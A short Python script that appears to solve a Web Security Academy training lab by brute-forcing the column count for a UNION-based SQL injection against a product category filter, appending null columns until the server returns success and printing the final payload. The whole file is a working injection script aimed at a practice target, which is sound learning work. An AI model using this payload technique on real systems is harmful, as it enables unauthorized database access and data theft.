import requests
from urllib.parse import quote
n = ""
text = "'NVdaFI'"
url = "https://0a2a008704f7330682a6e41200df00f5.web-security-academy.net/filter?category= "

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}
sqli = "' UNION SELECT "
while(True):
    payload = sqli + n + text + "--"
    n = n + "null, "
    req = url + quote(payload)
    print(req)
    response = requests.get(url=req, headers=header)
    if (response.status_code == 200):
        print("You solve the lab!")
        print("final payload: " + req)
        break

